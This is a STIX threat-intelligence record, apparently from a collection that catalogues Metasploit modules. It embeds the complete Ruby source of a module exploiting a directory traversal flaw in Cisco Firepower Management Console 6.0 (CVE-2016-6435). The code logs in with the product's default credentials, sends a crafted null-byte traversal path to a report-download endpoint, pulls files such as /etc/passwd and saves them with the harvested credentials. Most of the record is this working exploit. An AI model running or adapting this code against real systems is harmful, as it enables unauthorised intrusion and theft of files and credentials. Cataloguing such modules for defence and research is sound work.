{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fbd09ad2-2ff7-4317-a42a-7bf0b0d118e6",
    "created": "2024-08-14T16:29:28.90849Z",
    "modified": "2024-08-14T16:29:28.908495Z",
    "name": "\"Cisco Firepower Management Console 6.0 Post Auth Report Download Directory Traversal\"",
    "description": " This module exploits a directory traversal vulnerability in Cisco Firepower Management under the context of www user. Authentication is required to exploit this vulnerability.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/cisco_firepower_download.rb",
            "external_id": "cisco_firepower_download.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-6435"
        },
        {
            "source_name": "reference",
            "url": "https://blog.korelogic.com/blog/2016/10/10/virtual_appliance_spelunking"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Cisco Firepower Management Console 6.0 Post Auth Report Download Directory Traversal\",\n      'Description'    => %q{\n        This module exploits a directory traversal vulnerability in Cisco Firepower Management\n        under the context of www user. Authentication is required to exploit this vulnerability.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Matt',   # Original discovery && PoC\n          'sinn3r', # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2016-6435'],\n          ['URL', 'https://blog.korelogic.com/blog/2016/10/10/virtual_appliance_spelunking']\n        ],\n      'DisclosureDate' => '2016-10-10',\n      'DefaultOptions' =>\n        {\n          'RPORT' => 443,\n          'SSL'   => true,\n          'SSLVersion' => 'Auto'\n        }\n    ))\n\n    register_options(\n      [\n        # admin:Admin123 is the default credential for 6.0.1\n        OptString.new('USERNAME', [true, 'Username for Cisco Firepower Management console', 'admin']),\n        OptString.new('PASSWORD', [true, 'Password for Cisco Firepower Management console', 'Admin123']),\n        OptString.new('TARGETURI', [true, 'The base path to Cisco Firepower Management console', '/']),\n        OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/passwd'])\n      ])\n  end\n\n  def do_login(ip)\n    console_user = datastore['USERNAME']\n    console_pass = datastore['PASSWORD']\n    uri          = normalize_uri(target_uri.path, 'login.cgi')\n\n    print_status(\"Attempting to login in as #{console_user}:#{console_pass}\")\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => uri,\n      'vars_post' => {\n        'username' => console_user,\n        'password' => console_pass,\n        'target'   => ''\n      }\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while trying to log in.')\n    end\n\n    res_cookie = res.get_cookies\n    if res.code == 302 && res_cookie.include?('CGISESSID')\n      cgi_sid = res_cookie.scan(/CGISESSID=(\\w+);/).flatten.first\n      vprint_status(\"CGI Session ID: #{cgi_sid}\")\n      print_good(\"Authenticated as #{console_user}:#{console_pass}\")\n      report_cred(ip: ip, user: console_user, password: console_pass)\n      return cgi_sid\n    end\n\n    nil\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: rport,\n      service_name: 'cisco',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def download_file(cgi_sid, file)\n    file_path = \"../../..#{Rex::FileUtils.normalize_unix_path(file)}\\x00\"\n    print_status(\"Requesting: #{file_path}\")\n    send_request_cgi({\n      'method' => 'GET',\n      'cookie' => \"CGISESSID=#{cgi_sid}\",\n      'uri'    => normalize_uri(target_uri.path, 'events/reports/view.cgi'),\n      'vars_get' => {\n        'download' => '1',\n        'files'    => file_path\n      }\n    })\n  end\n\n  def remote_file_exists?(res)\n    (\n      res.headers['Content-Disposition'] &&\n      res.headers['Content-Disposition'].match(/attachment; filename=/) &&\n      res.headers['Content-Type'] &&\n      res.headers['Content-Type'] == 'application/octet-stream'\n    )\n  end\n\n  def save_file(res, ip)\n    fname = res.headers['Content-Disposition'].scan(/filename=(.+)/).flatten.first || File.basename(datastore['FILEPATH'])\n\n    path = store_loot(\n      'cisco.https',\n      'application/octet-stream',\n      ip,\n      res.body,\n      fname\n      )\n\n    print_good(\"File saved in: #{path}\")\n  end\n\n  def run_host(ip)\n    cgi_sid = do_login(ip)\n\n    unless cgi_sid\n      fail_with(Failure::Unknown, 'Unable to obtain the cookie session ID')\n    end\n\n    res = download_file(cgi_sid, datastore['FILEPATH'])\n\n    if res.nil?\n      print_error(\"Connection timed out while downloading: #{datastore['FILEPATH']}\")\n    elsif remote_file_exists?(res)\n      save_file(res, ip)\n    else\n      print_error(\"Remote file not found: #{datastore['FILEPATH']}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-10-10"
}